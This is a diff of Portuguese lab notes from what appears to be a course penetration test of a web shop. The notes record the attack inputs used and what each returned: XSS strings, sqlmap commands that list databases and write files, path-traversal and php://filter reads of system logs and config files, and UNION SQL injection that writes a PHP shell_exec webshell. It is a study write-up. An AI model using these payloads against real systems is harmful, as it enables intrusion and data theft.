@@ -26,7 +26,7 @@ Não chegando a qualquer resultado palpável, continuou-se a explorar o site, on
 	Assim sendo, começou-se a tentar injeções, novamente com base na aula prática 1.
 	Inicialmente fizemos várias tentativas para descobrir quantas colunas eram retornadas pelos queries feitos às bases de dados. Sabíamos que havia pelo menos 5 (name, price, type, details e id). 
 	
-	<ip>/details.php?<script>alert('eheh')</script>prod=3&type=3	
+	<ip>/details.php?<script>alert("eheh")</script>prod=3&type=3	
 		" DB Error, could not query the database MySQL Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1" 
 		A partir deste resultado ficamos a saber qual o SGDB usado para sustentar os dados do site. 
 	
@@ -86,7 +86,7 @@ Já na conta do admin, podendo postar novos blogs, testaram-se novas maneiras de
 	Resultando numa mensagem na consola: GET http://192.168.1.7/ola
 <img src="https://shifter.sapo.pt/wp-content/uploads/2018/03/rickrolled.png">
 	Embora não se possa colocar uma imagem no titulo, o conteúdo não é filtrado no sentido em que não verifica de onde vem a informação e posta tudo o que lhe é fornecido. 
-<script>alert('eheh')</script>
+<script>alert("eheh")</script>
 <div><p>"something"</p></div>
 <? php echo 'hello' ?>
 
@@ -94,7 +94,7 @@ Já na conta do admin, podendo postar novos blogs, testaram-se novas maneiras de
 Continuando com a exploração da página em si, suscitaram-nos a atenção dois pormenores:
 1. Aquando na página dos termos e condições (que também contém o email do admin), seria de esperar que clicar quer em GBP, EUR ou USD no rodapé da página fizesse algo, o que não aconteu, embora o atributo lang aparecesse no url. Isto será explorado mais à frente. 
 
-2. Querendo saber o que o portfolio fazia para iniciar o download, fizemos hover sobre o mesmo e obtivemos o seguinte urll:
+2. Querendo saber o que o portfolio fazia para iniciar o download, fizemos hover sobre o mesmo e obtivemos o seguinte url:
 	<ip>/download.php?item=Brochure.pdf
 	Explorado também mais à frente. 
 	
@@ -106,6 +106,10 @@ Analizar os resultados do nikto2:
 	#TODO
 Analizar os resultados do sqlmap:
 	#TODO
+	sqlmap --headers="User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:25.0) Gecko/20100101 Firefox/25.0" --cookie="level=1" -u '<ip>/products.php?type=1' --dbs
+	sqlmap --headers="User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:25.0) Gecko/20100101 Firefox/25.0" --cookie="level=1" -u '<ip>/products.php?type=1' --privileges
+	sqlmap --headers="User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:25.0) Gecko/20100101 Firefox/25.0" -u http://192.168.1.7/products.php?type=1  --file-write teste.php --file-dest /etc (não deu porque o DBMS process user não tem direitos sobre o diretório destino, o que foi confirmado pelo comando acima que disse que só tinha access rights)  
+ 
 Analizar os resultados do dirb: ($ dirb http://192.168.0.49/)
 	==> DIRECTORY: <ip>/admin/                                                           
 	==> DIRECTORY: <ip>/downloads/                                                       
@@ -224,7 +228,7 @@ Informações que mais saltaram à vista ao analizar os ficheiros .php:
 		
 			outro include, pode ser interessante
 			outra utilização de cookie
-			motivo pelo qual sqlmap e nikto não darão informação nenhuma??
+			motivo pelo qual sqlmap e nikto não darão informação nenhuma, bem como qualquer outro user_agent listado
 			
 	
 	info.php
@@ -236,17 +240,22 @@ Informações que mais saltaram à vista ao analizar os ficheiros .php:
 
 
 Com base no DOCUMENT_ROOT, começámos a tentar acessos à root:
-#TODO
+#TODO - explicar o porquê de termos tentado fazer isto.. aceder à root através de php injection, queriamos primeiro testar o terreno 
+
 	<ip>/download.php?item=../../../../../../../../var/www/html/index.php
-						   ../../../../etc/httpd/logs/access_log
                            ../../../../../../../../var/www/html/config.php
+                           
+    /products.php?type=1&lang=../../../../../../etc/timezone                        
 	&lang=../../../../../../../../etc/httpd/logs/access_log
+								 /etc/timezone
+								 /etc/httpd/logs/access_log
 								 /var/log/apache2/error.log
 								 /var/log/apache2/access.log
 								 /var/log/httpd/access.log
 								 /var/log/httpd/access_log
 								 /var/log/mysqld.log
 								 /var/log/httpd/error_log
+								 ________________________________________
 							 	 php://filter/read=convert.base64-encode/resource=../../../../../../../../etc/httpd/logs/access_log
 							 	 php://filter/read=convert.base64-encode/resource=connection.php
 								 php://filter/read=convert.base64-encode/resource=../../../../../../../../etc/httpd/logs/access.log	
@@ -263,4 +272,6 @@ Com base no DOCUMENT_ROOT, começámos a tentar acessos à root:
 	
 	1 union SELECT 1,2,3,“<?php shell_exec('ls); ?>”,5 INTO OUTFILE “../../../../../../var/www/html/ls.php”
 	1 union SELECT 1,LOAD_FILE(“../../../../../../var/www/html/ls.php”),3,4,5
+	1 union SELECT 1,2,“<?php echo("ola"); ?>”,4,5
+		como em display tem while ($row = mysql_fetch_assoc($result)), não será possível fazer display do echo porque não há nenhum nome na bd que corresponda a isso
 
